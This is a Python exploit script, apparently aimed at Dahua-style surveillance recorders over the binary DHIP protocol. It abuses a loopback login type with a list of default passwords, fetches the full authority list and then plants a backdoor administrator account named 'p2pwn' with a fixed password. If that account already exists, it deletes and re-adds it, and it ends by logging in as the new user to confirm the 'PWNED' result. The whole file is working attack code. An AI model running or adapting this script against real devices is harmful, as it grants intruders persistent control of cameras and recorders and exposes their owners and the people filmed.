import socket
import struct
import json

TARGET = ("127.0.0.1", 1337)
NEW_USER = "p2pwn"
NEW_PASS = "p2passwd"

MAGIC = b"\x20\x00\x00\x00DHIP"
DEFAULT_AUTH = [
    "AuthUserMag", "Monitor_01", "Replay_01", "AuthSysCfg", "AuthSysInfo",
    "AuthManuCtr", "AuthBackup", "AuthStoreCfg", "AuthEventCfg", "AuthNetCfg",
    "AuthPeripheral", "AuthAVParam", "AuthSecurity", "AuthMaintence",
]

def recv_frame(sock):
    buf = bytearray()
    while True:
        chunk = sock.recv(4096)
        if not chunk:
            raise ConnectionError("closed while waiting magic")
        buf += chunk
        idx = bytes(buf).find(MAGIC)
        if idx >= 0:
            del buf[:idx]
            break
    while len(buf) < 32:
        chunk = sock.recv(4096)
        if not chunk:
            raise ConnectionError("closed while reading hdr")
        buf += chunk
    body_len = struct.unpack("<I", buf[16:20])[0]
    while len(buf) < 32 + body_len:
        chunk = sock.recv(32 + body_len - len(buf))
        if not chunk:
            raise ConnectionError("closed while reading body")
        buf += chunk
    body = bytes(buf[32:32 + body_len])
    return json.loads(body.decode("utf-8", "ignore"))

def dhip_call(sock, method, params, sess, req_id, timeout=20, obj=None):
    sock.settimeout(timeout)
    body = {"method": method, "params": params, "id": req_id, "session": sess}
    if obj is not None:
        body["object"] = obj
    raw = json.dumps(body).encode()
    hdr = bytearray(32)
    hdr[0:8] = MAGIC
    struct.pack_into("<I", hdr, 8, sess)
    struct.pack_into("<I", hdr, 12, req_id)
    struct.pack_into("<I", hdr, 16, len(raw))
    struct.pack_into("<I", hdr, 24, len(raw))
    sock.sendall(hdr + raw)
    while True:
        pkt = recv_frame(sock)
        if int(pkt.get("id", -1)) == req_id:
            return pkt

def get_sess(pkt):
    s = pkt.get("session", 0)
    if isinstance(s, int) and s != 0:
        return s
    p = pkt.get("params") or {}
    s = p.get("session", 0)
    if isinstance(s, int) and s != 0:
        return s
    return 0

def loopback_login(sock):
    cands = ["admin", "", "888888", "123456"]
    # 1. в лоб с session=0
    for pwd in cands:
        r = dhip_call(sock, "global.login", {
            "userName": "admin", "password": pwd,
            "clientType": "Local", "loginType": "Loopback",
            "ipAddr": "127.0.0.1",
            "authorityType": "Default", "passwordType": "Plain",
        }, 0, 1)
        if r.get("result") is True:
            s = get_sess(r)
            if s:
                return s, ""
        p = r.get("params") or {}
        realm = p.get("realm", "")
        if "realm" in p and "random" in p and get_sess(r):
            ch = get_sess(r)
            for pwd2 in cands:
                r2 = dhip_call(sock, "global.login", {
                    "userName": "admin", "password": pwd2,
                    "clientType": "Local", "loginType": "Loopback",
                    "ipAddr": "127.0.0.1",
                    "authorityType": "Default", "passwordType": "Plain",
                }, ch, 2)
                if r2.get("result") is True:
                    s2 = get_sess(r2)
                    return (s2 if s2 else ch), realm
    return 0, ""

def main():
    import hashlib
    s = socket.create_connection(TARGET, timeout=10)
    try:
        sess, realm = loopback_login(s)
        print(f"[+] loopback sess: {sess}, realm: {realm}")
        if not sess:
            print("[-] loopback login failed")
            return

        r = dhip_call(s, "userManager.getAuthorityList", {}, sess, 4)
        auth = DEFAULT_AUTH
        fetched = []
        if r.get("result") is True and isinstance(r.get("params"), list) and r["params"]:
            fetched = [x for x in r["params"] if isinstance(x, str)]
            auth = fetched
        print(f"[+] authList fetched: {len(fetched)} default: {len(DEFAULT_AUTH)}")

        # Хеш пароля для Encryption: Default
        pwd_hash = hashlib.md5(f"{NEW_USER}:{realm}:{NEW_PASS}".encode()).hexdigest().upper()

        user_obj = {
            "Name": NEW_USER,
            "Password": pwd_hash,
            "Group": "admin",
            "AuthorityList": auth,
            "Sharable": True,
            "Reserved": False,
            "Encryption": "Default",
            "Type": "Normal",
            "Memo": "krushitel",
            "MacOnly": "",
            "MaxMonitorChannels": 0,
        }

        r = dhip_call(s, "userManager.addUser", {"user": user_obj}, sess, 5)
        print(f"[+] addUser response: {r}")
        if r.get("result") is not True:
            print("[-] addUser returned false/error (likely user exists). Deleting and re-adding...")
            del_r = dhip_call(s, "userManager.deleteUser", {"name": NEW_USER}, sess, 6)
            print(f"[+] deleteUser response: {del_r}")
            r = dhip_call(s, "userManager.addUser", {"user": user_obj}, sess, 7)
            print(f"[+] retry addUser response: {r}")

        if r.get("result") is True:
            print(f"[+] PWNED! Added user {NEW_USER}:{NEW_PASS} (Group: admin)")
            # Verify login under new user
            s2 = socket.create_connection(TARGET, timeout=10)
            try:
                r_probe = dhip_call(s2, "global.login", {
                    "userName": NEW_USER, "password": "",
                    "clientType": "Web3.0", "loginType": "Direct"
                }, 0, 1)
                p2 = r_probe.get("params") or {}
                sess2 = get_sess(r_probe)
                realm2 = p2.get("realm", "")
                random2 = p2.get("random", "")
                h1 = hashlib.md5(f"{NEW_USER}:{realm2}:{NEW_PASS}".encode()).hexdigest().upper()
                h2 = hashlib.md5(f"{NEW_USER}:{random2}:{h1}".encode()).hexdigest().upper()
                r_login = dhip_call(s2, "global.login", {
                    "userName": NEW_USER, "password": h2,
                    "clientType": "Web3.0", "loginType": "Direct",
                    "ipAddr": "127.0.0.1", "authorityType": "Default", "passwordType": "Default"
                }, sess2, 2)
                if r_login.get("result") is True:
                    print(f"[+] VERIFIED: Successfully logged in as {NEW_USER} (session: {get_sess(r_login)})!")
                else:
                    print(f"[-] Verification login failed: {r_login}")
            finally:
                s2.close()
        else:
            print(f"[-] Failed: {r.get('error')}")
    finally:
        s.close()

if __name__ == "__main__":
    main()

